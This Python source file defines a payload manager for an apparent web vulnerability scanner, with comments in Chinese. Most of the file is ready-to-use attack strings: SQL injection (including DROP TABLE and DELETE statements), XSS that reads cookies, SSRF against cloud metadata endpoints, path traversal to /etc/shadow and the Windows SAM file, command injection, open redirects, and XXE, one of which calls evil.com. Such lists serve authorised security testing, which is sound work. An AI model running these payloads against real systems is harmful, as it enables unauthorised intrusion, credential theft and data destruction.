"""
Enhanced Payload Manager - 增强型Payload管理器

参考 PayloadsAllTheThings 等开源项目设计的全面Payload库
支持按漏洞类型、上下文智能选择Payload
"""

import random
from typing import Dict, List, Optional, Any, Callable
from dataclasses import dataclass
import logging

logger = logging.getLogger(__name__)


@dataclass
class Payload:
    """Payload数据结构"""
    value: str
    category: str
    severity: str = "medium"
    description: str = ""
    cwe: str = ""


class EnhancedPayloadManager:
    """
    增强型Payload管理器
    
    特性：
    - 按漏洞类型分类
    - 按严重程度分级
    - 支持智能选择
    - 支持上下文感知
    """
    
    SQLI_PAYLOADS = {
        'boolean': [
            "' OR 1=1--",
            "' OR '1'='1",
            "1' AND '1'='1",
            "1' AND 1=1--",
            "admin' OR '1'='1",
            "' OR 1=1#",
            "1' OR '1'='1'/*",
        ],
        'time_based': [
            "1' AND SLEEP(5)--",
            "1' AND BENCHMARK(5000000,SHA1('test'))--",
            "1'; WAITFOR DELAY '00:05'--",
            "1' OR SLEEP(5)#",
            "1' AND (SELECT * FROM (SELECT SLEEP(3))a)--",
        ],
        'union': [
            "' UNION SELECT NULL--",
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT NULL,NULL--",
            "' UNION ALL SELECT NULL--",
            "1' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT username,password FROM users--",
        ],
        'error': [
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
            "' AND UPDATEXML(1,CONCAT(0x7e,version()),1)--",
            "1' AND 1=CONVERT(int,(SELECT table_name FROM information_schema.tables))--",
        ],
        'stacked': [
            "1; DROP TABLE users--",
            "'; DELETE FROM users WHERE 1=1--",
            "1'; INSERT INTO users VALUES(1,'admin','password')--",
        ],
        'out_of_band': [
            "' UNION SELECT NULL,NULL,NULL INTO OUTFILE '/tmp/test.txt'--",
        ]
    }
    
    XSS_PAYLOADS = {
        'reflected': [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<iframe src=javascript:alert(1)>",
            "<body onload=alert(1)>",
            "<input onfocus=alert(1) autofocus>",
            "<select onfocus=alert(1) autofocus>",
            "<textarea onfocus=alert(1) autofocus>",
            "<keygen onfocus=alert(1) autofocus>",
            "<video><source onerror=alert(1)>",
            "<audio src=x onerror=alert(1)>",
        ],
        'stored': [
            "javascript:alert(1)",
            "<img src=x onerror=alert(String.fromCharCode(88,83,83))>",
            "<svg onload=alert(document.domain)>",
        ],
        'dom': [
            "#<img src=x onerror=alert(1)>",
            "#alert(1)",
            "javascript:alert(document.cookie)",
            "<svg/onload=alert(1)>",
        ],
        'polyglot': [
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert(1) //)/**/</script///<script/alert(1)//",
            "'-alert(1)-'",
            "\"><script>alert(1)</script>",
            "'\"><script>alert(String.fromCharCode(88,83,83))</script>",
        ],
        'filter_bypass': [
            "<scr<script>ipt>alert(1)</scr<script>ipt>",
            "<ScRiPt>alert(1)</sCrIpT>",
            "<script>al\\ert(1)</script>",
            "<script>\\u0061lert(1)</script>",
            "<img src=\"x:alert(1)\"/>",
        ]
    }
    
    SSRF_PAYLOADS = {
        'localhost': [
            "http://127.0.0.1",
            "http://localhost",
            "http://[::1]",
            "http://0.0.0.0",
            "http://2130706433",
        ],
        'cloud_metadata': [
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/user-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://metadata.google.internal/computeMetadata/v1/instance/hostname",
            "http://100.100.100.200/latest/meta-data/",
            "http://192.0.0.1/latest/meta-data/",
        ],
        'dns_rebind': [
            "http://127.0.0.1.nip.io",
            "http://localhost.127.0.0.1.nip.io",
            "http://2130706433.nip.io",
        ],
        'internal_scan': [
            "http://10.0.0.1",
            "http://10.255.255.1",
            "http://172.16.0.1",
            "http://172.31.255.1",
            "http://192.168.0.1",
            "http://192.168.255.1",
        ],
        'bypass': [
            "http://127.1",
            "http://0x7f000001",
            "http://017700000001",
            "http://224.0.0.1",
            "http://127.0.0.1.xip.io",
        ]
    }
    
    PATH_TRAVERSAL_PAYLOADS = {
        'unix': [
            "../../../etc/passwd",
            "../../../../etc/passwd",
            "../../../../../etc/passwd",
            "../../../../../../etc/passwd",
            "....//....//....//....//etc/passwd",
            "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
            "..%252F..%252F..%252F..%252Fetc%252Fpasswd",
            "/etc/passwd",
            "/etc/shadow",
            "/etc/hosts",
        ],
        'windows': [
            "..\\..\\..\\..\\windows\\system32\\config\\sam",
            "..\\..\\..\\..\\..\\..\\..\\windows\\system32\\config\\sam",
            "....\\\\....\\\\....\\\\....\\\\windows\\\\system32\\\\config\\\\sam",
            "C:\\Windows\\System32\\config\\SAM",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
        ],
        'url_encoded': [
            "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5csystem32%5cconfig%5csam",
        ],
        'null_byte': [
            "../../../etc/passwd%00",
            "..%00../etc/passwd",
            "../../../etc/passwd\\x00",
        ],
        'double_encoding': [
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%255f..%255f..%255fetc%255fpasswd",
        ]
    }
    
    COMMAND_INJECTION_PAYLOADS = {
        'unix': [
            "; ls",
            "| ls",
            "& ls",
            "&& ls",
            "|| ls",
            "`ls`",
            "$(ls)",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
        ],
        'windows': [
            "; dir",
            "| dir",
            "& dir",
            "&& dir",
            "|| dir",
            "`dir`",
            "$(dir)",
        ],
        'blind': [
            "; sleep 5",
            "| sleep 5",
            "& sleep 5",
            "&& sleep 5",
            "|| ping -c 5 127.0.0.1",
        ],
        'filter_bypass': [
            "ls${IFS}-la",
            "ls\t-la",
            "ls\x20-la",
            "${PATH:0:1}ls",
        ]
    }
    
    OPEN_REDIRECT_PAYLOADS = {
        'basic': [
            "https://google.com",
            "https://evil.com",
            "//google.com",
            "///google.com",
            "javascript:alert(1)",
        ],
        'encoded': [
            "https://google.com%00.evil.com",
            "//google.com%00.evil.com",
            "https://google%E2%80%8E.com",
        ],
        'parameter': [
            "https://google.com?.evil.com",
            "https://google.com#.evil.com",
            "https://google.com\\@evil.com",
        ]
    }
    
    XXE_PAYLOADS = [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><foo>&xxe;</foo>',
    ]
    
    def __init__(self):
        self.custom_payloads: Dict[str, List[str]] = {}
        self.payload_cache: Dict[str, List[Payload]] = {}
        self.stats = {
            'total_used': 0,
            'by_category': {}
        }
    
    def get_payloads(
        self,
        vuln_type: str,
        sub_type: Optional[str] = None,
        count: Optional[int] = None,
        severity: Optional[str] = None
    ) -> List[str]:
        """
        获取Payload列表
        
        Args:
            vuln_type: 漏洞类型 (sql_injection, xss, ssrf, path_traversal, command_injection, open_redirect, xxe)
            sub_type: 子类型（如 sql_injection 下的 boolean, time_based 等）
            count: 返回数量限制
            severity: 严重程度过滤 (low, medium, high, critical)
            
        Returns:
            Payload列表
        """
        payloads = []
        
        if vuln_type == 'sql_injection':
            if sub_type and sub_type in self.SQLI_PAYLOADS:
                payloads = self.SQLI_PAYLOADS[sub_type]
            else:
                payloads = self._flatten_payloads(self.SQLI_PAYLOADS)
        
        elif vuln_type == 'xss':
            if sub_type and sub_type in self.XSS_PAYLOADS:
                payloads = self.XSS_PAYLOADS[sub_type]
            else:
                payloads = self._flatten_payloads(self.XSS_PAYLOADS)
        
        elif vuln_type == 'ssrf':
            if sub_type and sub_type in self.SSRF_PAYLOADS:
                payloads = self.SSRF_PAYLOADS[sub_type]
            else:
                payloads = self._flatten_payloads(self.SSRF_PAYLOADS)
        
        elif vuln_type == 'path_traversal':
            if sub_type and sub_type in self.PATH_TRAVERSAL_PAYLOADS:
                payloads = self.PATH_TRAVERSAL_PAYLOADS[sub_type]
            else:
                payloads = self._flatten_payloads(self.PATH_TRAVERSAL_PAYLOADS)
        
        elif vuln_type == 'command_injection':
            if sub_type and sub_type in self.COMMAND_INJECTION_PAYLOADS:
                payloads = self.COMMAND_INJECTION_PAYLOADS[sub_type]
            else:
                payloads = self._flatten_payloads(self.COMMAND_INJECTION_PAYLOADS)
        
        elif vuln_type == 'open_redirect':
            if sub_type and sub_type in self.OPEN_REDIRECT_PAYLOADS:
                payloads = self.OPEN_REDIRECT_PAYLOADS[sub_type]
            else:
                payloads = self._flatten_payloads(self.OPEN_REDIRECT_PAYLOADS)
        
        elif vuln_type == 'xxe':
            payloads = self.XXE_PAYLOADS
        
        elif vuln_type in self.custom_payloads:
            payloads = self.custom_payloads[vuln_type]
        
        if count:
            payloads = self._smart_select(payloads, count)
        
        self.stats['total_used'] += len(payloads)
        self.stats['by_category'][vuln_type] = self.stats['by_category'].get(vuln_type, 0) + len(payloads)
        
        return payloads
    
    def _flatten_payloads(self, payload_dict: Dict[str, List[str]]) -> List[str]:
        """扁平化payload字典"""
        result = []
        for payloads in payload_dict.values():
            result.extend(payloads)
        return result
    
    def _smart_select(self, payloads: List[str], count: int) -> List[str]:
        """
        智能选择Payload
        
        优先选择：
        1. 高严重程度
        2. 较短（减少检测时间）
        3. 经典payload（更可靠）
        """
        if len(payloads) <= count:
            return payloads
        
        priority_payloads = []
        other_payloads = []
        
        for p in payloads:
            if self._is_high_priority(p):
                priority_payloads.append(p)
            else:
                other_payloads.append(p)
        
        selected = priority_payloads[:count]
        remaining = count - len(selected)
        
        if remaining > 0 and other_payloads:
            selected.extend(random.sample(other_payloads, min(remaining, len(other_payloads))))
        
        return selected
    
    def _is_high_priority(self, payload: str) -> bool:
        """判断是否为高优先级payload"""
        high_priority_patterns = [
            "OR 1=1",
            "UNION SELECT",
            "<script>alert",
            "alert(1)",
            "SLEEP(",
            "169.254.169.254",
            "/etc/passwd",
        ]
        
        for pattern in high_priority_patterns:
            if pattern in payload:
                return True
        
        return False
    
    def add_custom_payloads(self, vuln_type: str, payloads: List[str]):
        """添加自定义payload"""
        if vuln_type not in self.custom_payloads:
            self.custom_payloads[vuln_type] = []
        self.custom_payloads[vuln_type].extend(payloads)
    
    def get_payload_for_context(
        self,
        vuln_type: str,
        context: str,
        response_type: Optional[str] = None
    ) -> List[str]:
        """
        根据上下文智能选择Payload
        
        Args:
            vuln_type: 漏洞类型
            context: 上下文 (json, html, url_param, header, xml)
            response_type: 响应类型 (json, html, xml, plain)
        """
        payloads = []
        
        if vuln_type == 'sql_injection':
            if response_type == 'json':
                payloads = self.get_payloads('sql_injection', 'union', count=10)
            elif context == 'url_param':
                payloads = self.get_payloads('sql_injection', 'boolean', count=10)
            else:
                payloads = self.get_payloads('sql_injection', count=15)
        
        elif vuln_type == 'xss':
            if response_type == 'html':
                payloads = self.get_payloads('xss', 'reflected', count=10)
            elif response_type == 'json':
                payloads = self.get_payloads('xss', 'filter_bypass', count=10)
            else:
                payloads = self.get_payloads('xss', count=15)
        
        elif vuln_type == 'ssrf':
            if context == 'cloud':
                payloads = self.get_payloads('ssrf', 'cloud_metadata', count=10)
            else:
                payloads = self.get_payloads('ssrf', count=15)
        
        else:
            payloads = self.get_payloads(vuln_type, count=10)
        
        return payloads
    
    @property
    def available_types(self) -> List[str]:
        """获取所有可用漏洞类型"""
        types_list = [
            'sql_injection',
            'xss',
            'ssrf',
            'path_traversal',
            'command_injection',
            'open_redirect',
            'xxe'
        ]
        types_list.extend(self.custom_payloads.keys())
        return types_list
    
    @property
    def statistics(self) -> Dict[str, Any]:
        """获取使用统计"""
        return dict(self.stats)


def create_payload_manager() -> EnhancedPayloadManager:
    """创建Payload管理器单例"""
    if not hasattr(create_payload_manager, '_instance'):
        create_payload_manager._instance = EnhancedPayloadManager()
    return create_payload_manager._instance
